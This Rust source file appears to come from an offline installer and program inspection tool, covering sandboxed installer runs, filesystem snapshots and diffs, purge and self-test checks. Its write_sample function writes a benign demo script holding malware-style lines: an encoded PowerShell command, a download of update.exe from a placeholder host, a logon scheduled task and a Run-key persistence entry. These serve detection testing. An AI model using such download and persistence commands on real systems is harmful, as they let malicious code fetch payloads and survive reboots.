//! End-to-end workflows wiring the five modules together.

use crate::cleanup::CleanupController;
use crate::json::Value;
use crate::rea_bridge::{ReaBridge, ReaConfig};
use crate::registry_sandbox::RegistrySandbox;
use crate::snapshot::Snapshot;
use crate::universal_sandbox::{Sandbox, SandboxConfig};
use crate::util::unix_secs;
use crate::{Error, Result};
use std::path::{Path, PathBuf};

pub struct ScanOptions {
    pub target: PathBuf,
    pub rea_path: Option<PathBuf>,
}

/// Mode A — Local Program Inspection.
pub fn mode_scan(opts: ScanOptions) -> Result<Value> {
    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path, timeout: None });
    let report = bridge.analyze(&opts.target)?;
    Ok(Value::obj(vec![
        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
        ("mode", Value::str("local-scan")),
        ("generated_unix", Value::num(unix_secs())),
        ("verdict", Value::str(report.verdict())),
        ("report", report.to_json()),
    ]))
}

pub struct SandboxOptions {
    pub installer: PathBuf,
    pub installer_args: Vec<String>,
    pub rea_path: Option<PathBuf>,
    pub sandbox: SandboxConfig,
}

/// Mode B — Ephemeral Sandbox & Differential Installer Inspection.
/// Steps 1–6 of the blueprint workflow; purge runs on *every* exit path
/// unless `--keep` was given (the hive is always unmounted).
pub fn mode_sandbox(opts: SandboxOptions) -> Result<Value> {
    // 2. Environment preparation
    let sandbox = Sandbox::prepare(opts.sandbox.clone())?;
    let mut registry = RegistrySandbox::new(&sandbox.root, &sandbox.id);
    let mut registry_warning: Option<String> = None;
    if let Err(e) = registry.mount() {
        // Non-admin / no seeded hive: continue with env redirection and
        // say so in the report instead of failing the inspection.
        registry_warning = Some(e.to_string());
    }
    let install_dir = sandbox.install_dir.clone();

    let result = run_sandbox_inner(&opts, &sandbox, &install_dir);

    // 6. Teardown & purge (also on analysis failure).
    let mut purge_json = Value::Null;
    let mut purge_error: Option<String> = None;
    if opts.sandbox.keep {
        if let Err(e) = registry.unmount() { purge_error = Some(e.to_string()); }
    } else {
        match CleanupController::purge_sandbox(&sandbox.root, Some(&mut registry), false) {
            Ok(p) => purge_json = Value::obj(vec![
                ("path", Value::str(p.path)),
                ("removed", Value::Bool(p.removed)),
                ("verified_zero_residue", Value::Bool(p.verified_zero_residue)),
            ]),
            Err(e) => purge_error = Some(e.to_string()),
        }
    }

    let mut report = result?;
    if let Value::Object(map) = &mut report {
        if let Some(w) = registry_warning { map.insert("registry_warning".into(), Value::str(w)); }
        map.insert("purge".into(), purge_json);
        if let Some(e) = purge_error { map.insert("purge_error".into(), Value::str(e)); }
        map.insert("sandbox_kept".into(), Value::Bool(opts.sandbox.keep));
        if opts.sandbox.keep {
            map.insert("sandbox_path".into(), Value::str(sandbox.root.display().to_string()));
        }
    }
    Ok(report)
}

fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Path) -> Result<Value> {
    // Baseline snapshot of the (empty) install target.
    let before = Snapshot::capture(install_dir)?;
    // Baseline of the *whole* sandbox tree: installers also drop files
    // into the redirected profile (USERPROFILE/APPDATA point at the root),
    // which an install\-only diff would silently miss.
    let sandbox_before = Snapshot::capture(&sandbox.root)?;
    // 3. Execution under containment.
    let outcome = sandbox.run_installer(&opts.installer, &opts.installer_args)?;
    // 4. Post-install snapshot & delta.
    let after = Snapshot::capture(install_dir)?;
    let delta = before.diff(&after);
    let sandbox_after = Snapshot::capture(&sandbox.root)?;
    let mut sandbox_delta = sandbox_before.diff(&sandbox_after);
    // Drop our own bookkeeping areas from the whole-tree view: the install
    // dir is already reported in `delta`; tmp/work/hive are sandbox guts.
    let is_internal = |p: &str| {
        p.starts_with("install/") || p.starts_with("tmp/") || p.starts_with("work/")
            || p == "sandbox_reg.dat"
    };
    sandbox_delta.added.retain(|e| !is_internal(&e.path));
    sandbox_delta.modified.retain(|e| !is_internal(&e.path));
    sandbox_delta.deleted.retain(|e| !is_internal(&e.path));
    sandbox_delta.unchanged.retain(|e| !is_internal(&e.path));
    // 5. REA inspection of exactly what the installer changed, plus the
    // installer binary itself (its own PE/scripts are evidence too).
    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path.clone(), timeout: None });
    let rea_report = bridge.analyze(install_dir)?;
    let installer_report = bridge.analyze(&opts.installer).ok();
    Ok(Value::obj(vec![
        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
        ("mode", Value::str("sandbox-installer")),
        ("generated_unix", Value::num(unix_secs())),
        ("verdict", Value::str(rea_report.verdict())),
        ("installer", Value::str(opts.installer.display().to_string())),
        ("execution", Value::obj(vec![
            ("command", Value::str(outcome.command.clone())),
            ("exit_code", outcome.exit_code.map(|c| Value::num(c as u64)).unwrap_or(Value::Null)),
            ("timed_out", Value::Bool(outcome.timed_out)),
            ("duration_ms", Value::num(outcome.duration_ms)),
            ("stdout_tail", Value::str(outcome.stdout_tail.clone())),
            ("stderr_tail", Value::str(outcome.stderr_tail.clone())),
            ("stdout_bytes", Value::num(outcome.stdout_bytes)),
            ("stderr_bytes", Value::num(outcome.stderr_bytes)),
        ])),
        ("installer_report", installer_report.map(|r| r.to_json()).unwrap_or(Value::Null)),
        ("delta", delta.to_json()),
        // Files changed outside install\ but inside the sandbox (e.g. the
        // redirected profile). Anything changed outside the sandbox tree
        // itself is, by definition, not visible to this zero-driver view.
        ("sandbox_delta", sandbox_delta.to_json()),
        ("report", rea_report.to_json()),
    ]))
}

/// Preflight checks for an offline machine: platform, temp/sandbox
/// writability (a full create→purge rehearsal), REA discovery.
pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
    let bridge = ReaBridge::new(ReaConfig { rea_path, timeout: None });
    let rea_found = bridge.resolved_rea_path();
    // Rehearse the sandbox lifecycle in miniature.
    let rehearsal = (|| -> Result<bool> {
        let dir = crate::util::temp_root().join(format!("rea_sandbox_{}", crate::util::new_id()));
        std::fs::create_dir_all(&dir)?;
        std::fs::write(dir.join("doctor.txt"), b"ok")?;
        Ok(CleanupController::purge_dir(&dir, false)?.verified_zero_residue)
    })();
    // Prove the hash primitives work on *this* build, not just in CI: a
    // mangled toolchain or a bad cross-compile must be caught before an
    // operator trusts a hash in a report.
    let sha_ok = crate::sha256::hash_bytes(b"abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    let md5_ok = crate::md5::hash_bytes(b"abc") == "900150983cd24fb0d6963f7d28e17f72";
    Ok(Value::obj(vec![
        ("schema_version", Value::num(3)),
        ("mode", Value::str("doctor")),
        ("version", Value::str(env!("CARGO_PKG_VERSION"))),
        ("hashes", Value::obj(vec![
            ("sha256_selftest", Value::Bool(sha_ok)),
            ("md5_selftest", Value::Bool(md5_ok)),
        ])),
        ("os", Value::str(std::env::consts::OS)),
        ("arch", Value::str(std::env::consts::ARCH)),
        ("windows_job_objects", Value::Bool(cfg!(windows))),
        ("registry_hive_mount", Value::str(if cfg!(windows) {
            "available (requires SeRestorePrivilege + a valid hive file)"
        } else { "not applicable on this OS" })),
        ("temp_dir", Value::str(crate::util::temp_root().display().to_string())),
        ("sandbox_rehearsal_ok", match &rehearsal { Ok(ok) => Value::Bool(*ok), Err(_) => Value::Bool(false) }),
        ("sandbox_rehearsal_error", rehearsal.err().map(|e| Value::str(e.to_string())).unwrap_or(Value::Null)),
        ("rea", match rea_found {
            Some(p) => Value::obj(vec![("found", Value::Bool(true)), ("path", Value::str(p.display().to_string()))]),
            None => Value::obj(vec![("found", Value::Bool(false)),
                ("path", Value::str("native analyzer fallback (fully functional offline)"))]),
        }),
    ]))
}

pub fn mode_snapshot(dir: &Path) -> Result<Value> {
    Ok(Snapshot::capture(dir)?.to_json())
}

pub fn mode_diff(before_path: &Path, after_path: &Path) -> Result<Value> {
    let before = Snapshot::load(before_path)?;
    let after = Snapshot::load(after_path)?;
    Ok(before.diff(&after).to_json())
}

pub fn mode_purge(path: &Path, force: bool) -> Result<Value> {
    if !path.exists() { return Err(Error::NotFound(path.to_path_buf())); }
    let report = CleanupController::purge_dir(path, force)?;
    Ok(Value::obj(vec![
        ("path", Value::str(report.path)),
        ("removed", Value::Bool(report.removed)),
        ("verified_zero_residue", Value::Bool(report.verified_zero_residue)),
    ]))
}

/// Write a sample file for trying the tool / the CI smoke run.
///
/// `pe`    — a small, structurally valid PE32+ ("demo installer") whose
///           import table and embedded strings give the analyzer and the
///           rule engine something real to chew on. It is benign: nothing
///           is executed, and the payload is plain text.
/// `script` — a text file with the same capability strings, to exercise the
///           non-PE path (entropy, indicators, rules) without any binary.
pub fn write_sample(path: &Path, kind: &str) -> Result<PathBuf> {
    let bytes = match kind.to_ascii_lowercase().as_str() {
        "pe" | "exe" | "binary" => crate::testutil::demo_installer_bytes(),
        "script" | "text" => {
            let mut text = String::new();
            text.push_str("@echo off\nrem rea-offline demo: benign sample, not a real installer\n");
            text.push_str("powershell -enc ZQBjAGgAbwAgAGgAaQA=\n");
            text.push_str("powershell -Command \"Invoke-WebRequest https://example.invalid/update.exe\"\n");
            text.push_str("schtasks /create /tn Demo /tr demo.exe /sc onlogon\n");
            text.push_str("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d demo.exe\n");
            text
                .into_bytes()
        }
        other => {
            return Err(Error::InvalidInput(format!(
                "--kind must be pe or script (got '{other}')"
            )))
        }
    };
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    std::fs::write(path, &bytes)?;
    Ok(path.to_path_buf())
}
